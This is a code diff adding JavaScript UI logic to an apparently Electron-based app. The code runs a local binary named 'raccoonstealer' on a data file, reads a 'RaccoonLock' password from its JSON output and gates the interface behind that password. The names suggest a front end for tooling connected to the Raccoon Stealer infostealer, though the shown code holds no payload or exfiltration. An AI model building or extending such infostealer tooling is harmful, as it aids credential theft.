@@ -1,5 +1,45 @@
 const fs = require('fs');
 
+let password;
+
+function main(){
+   exec(raccoonstealer, ['-d', '-y', `${path}/data.rlc`], (error, stdout, stderr) =>{
+	   if (error) window.location.href = `error.html?err=${encodeURIComponent(error)}`;
+	   if (stderr) window.location.href = `error.html?err=${encodeURIComponent(stderr)}`;
+	   try{
+		let jsonstring = paths.getCorrectJSON(stdout);
+		let json =JSON.parse(jsonstring);
+		password = json.RaccoonLock;
+	   }catch(e){
+		   window.location.href = `error.html?err=${encodeURIComponent(e)}`;
+	   }
+	   verify.classList.remove('hidden');
+	   verify.style.display = 'flex';
+	   verify.style.animation = 'fadein 0.5s';
+   });
+}
+
+document.getElementById('vsubmit').addEventListener('click', () =>{
+	let pass = document.getElementById('vpass').value;
+	let errorv = document.getElementById('errorv');
+
+	if (pass !== password){
+		errorv.classList.remove('hidden');
+		return;
+	}
+
+	verify.style.animation = "fadeout 0.5s forwards";
+	setTimeout(() =>{
+		verify.style.display = 'none';
+		text.classList.remove('hidden');
+		buttons.classList.remove('hidden');
+		text.style.display = 'flex';
+		buttons.style.display = 'flex';
+		text.style.animation = 'fadein 0.5s';
+		buttons.style.animation = 'fadein 0.5s';
+	}, 600);
+});
+
 document.getElementById('accept').addEventListener('click', () =>{
     let text = document.getElementById('text');
     let buttons = document.getElementById('buttons');
